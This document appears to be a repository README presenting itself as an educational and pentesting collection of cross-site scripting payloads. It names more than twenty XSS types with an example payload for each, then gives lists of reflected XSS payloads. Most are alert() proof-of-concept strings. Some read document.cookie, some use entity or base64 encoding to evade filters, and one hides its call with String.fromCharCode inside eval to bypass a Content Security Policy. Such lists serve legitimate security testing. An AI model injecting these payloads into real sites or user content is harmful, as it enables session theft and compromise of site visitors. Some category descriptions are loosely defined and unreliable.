# XSS Payloads Repository

## 🚨 About This Repository
This repository is a comprehensive collection of **XSS (Cross-Site Scripting) Payloads** designed for educational, research, and penetration testing purposes. It includes payloads for various XSS attack types, ranging from common techniques to advanced exploitation methods. Security researchers, bug bounty hunters, and developers can utilize these payloads to test, identify, and mitigate XSS vulnerabilities effectively.

## 🧪 Types of XSS Payloads
This repository features payloads for the following XSS attack types:

### 🔹 Reflected XSS
- Occurs when untrusted data is included in the immediate response without proper validation.
- Payload Example: `<script>alert(1)</script>`

### 🔹 Stored XSS
- Occurs when malicious scripts are permanently stored on the server and executed when accessed.
- Payload Example: `<img src="x" onerror="alert(1)">`

### 🔹 DOM-Based XSS
- Exploits client-side JavaScript manipulation within the DOM.
- Payload Example: `document.write("<img src='x' onerror='alert(1)'>");`

### 🔹 Blind XSS
- Injects payloads in areas that execute later (e.g., admin panels, logs).
- Payload Example: `<svg onload=alert(1)>`

### 🔹 Self XSS
- Exploits users tricked into executing malicious code in their own browsers.
- Payload Example: `javascript:alert(document.cookie)`

### 🔹 Mutation XSS
- Exploits HTML parsers that automatically modify injected payloads.
- Payload Example: `<a href="javascript:alert(1)">Click me</a>`

### 🔹 Polyglot XSS
- Uses hybrid payloads that execute in multiple contexts (HTML, JavaScript, etc.).
- Payload Example: `"><img src=x onerror=alert(1)>`

### 🔹 Universal XSS (UXSS)
- Exploits browser vulnerabilities rather than web applications.
- Payload Example: Browser-specific exploits vary widely.

### 🔹 Attribute-Based XSS
- Injects payloads directly into HTML attributes.
- Payload Example: `<input value='" onfocus="alert(1)' autofocus>`

### 🔹 Cookie-Based XSS
- Exploits insecure cookies to deliver malicious scripts.
- Payload Example: `document.cookie="malicious=1"; alert(document.cookie);`

### 🔹 Post-Based XSS
- Exploits XSS payloads via HTTP POST requests.
- Payload Example: `<input type="text" value="<script>alert(1)</script>">`

### 🔹 JSON-Based XSS
- Injects malicious code into JSON responses processed by JavaScript.
- Payload Example: `{"name":"<script>alert(1)</script>"}`

### 🔹 WebSocket XSS
- Exploits insecure WebSocket connections to inject scripts.
- Payload Example: `ws.send('<script>alert(1)</script>')`

### 🔹 Indirect XSS
- Payloads that exploit third-party integrations to execute code.
- Payload Example: Using vulnerable API endpoints.

### 🔹 Iframe-Based XSS
- Uses iframes to deliver XSS payloads.
- Payload Example: `<iframe src="javascript:alert(1)"></iframe>`

### 🔹 PDF-Based XSS
- Injects JavaScript directly into PDF viewers.
- Payload Example: `/#whatever#javascript:alert(document.cookie)`

### 🔹 SVG-Based XSS
- Exploits SVG elements to trigger malicious code.
- Payload Example: `<svg><script>alert(1)</script></svg>`

### 🔹 Flash-Based XSS
- Targets Flash vulnerabilities (mainly legacy systems).
- Payload Example: Flash-specific exploits vary based on software version.

### 🔹 AJAX XSS
- Payloads designed to exploit AJAX requests.
- Payload Example: `$.get("/vuln", {data:"<script>alert(1)</script>"});`

### 🔹 CSP Bypass XSS
- Exploits misconfigured Content Security Policies.
- Payload Example: `<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">`

### 🔹 Canonical XSS
- Uses encoding techniques to bypass security filters.
- Payload Example: `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`

### 🔹 Event Handler XSS
- Executes payloads via JavaScript event handlers.
- Payload Example: `<img src=x onerror=alert(1)>`

### 🔹 JSONP XSS
- Targets insecure JSONP endpoints to execute payloads.
- Payload Example: `callback=<script>alert(1)</script>`

### 🔹 XHR-Based XSS
- Exploits XMLHttpRequest to deliver payloads.
- Payload Example: `xhr.open("GET", "javascript:alert(1)", true);`

---

## 📋 Reflected XSS Payloads

### Common Reflected XSS Payloads
- `<script>alert('XSS')</script>`
- `"><script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `<svg onload=alert('XSS')>`
- `<iframe src="javascript:alert('XSS')"></iframe>`
- `<body onload=alert('XSS')>`
- `<link rel="stylesheet" href="javascript:alert('XSS')">`
- `<a href="javascript:alert('XSS')">Click me</a>`
- `<input value="" onfocus="alert('XSS')">`
- `<div onmouseover="alert('XSS')">Hover me</div>`

### Advanced Reflected XSS Techniques
- `"><img src=x onerror=alert('XSS')>`
- `"><svg onload=alert('XSS')>`
- `<img src=1 onerror='alert("XSS")'>`
- `<svg><script>alert('XSS')</script>`
- `javascript:alert('XSS')`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
- `<iframe src="javascript:alert('XSS')"></iframe>`
- `" onfocus="alert('XSS')" autofocus`
- `" onclick="alert('XSS')">Click me`
- `'><img src=x onerror=alert('XSS')>`

---

